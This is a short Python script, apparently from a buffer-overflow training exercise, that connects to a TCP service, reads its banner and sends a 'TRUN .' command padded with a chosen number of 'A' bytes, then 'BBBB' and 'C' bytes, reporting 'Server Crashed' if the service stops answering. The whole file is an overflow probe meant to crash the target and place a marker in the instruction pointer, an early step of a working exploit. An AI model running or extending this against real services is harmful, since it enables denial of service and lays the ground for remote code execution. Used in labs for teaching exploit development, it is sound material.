import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])
length=int(sys.argv[3])

#AF_INET -> IPv4
#SOCK_STREAM -> TCP Connection (SOCK_DGRAM -> UDP)
#Constructor
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#initiate the connection
sock.connect((ip, port))
sock.settimeout(5)

#Grab the banner out of socket and print it
#.decode() -> convert binary data into ascii (gets rid of the b'')
data = sock.recv(4096).decode()
print(data)

try:
	print("Trying length: " + str(length))
	#A -> 41 in hex, BCDE -> 42434445
	badstr = "TRUN ." + "A"*length + "BBBB" + "C"*30
	sock.send(badstr.encode())
	data = sock.recv(4096).decode()
	print(data)
except:
	print("Server Crashed")

sock.close()
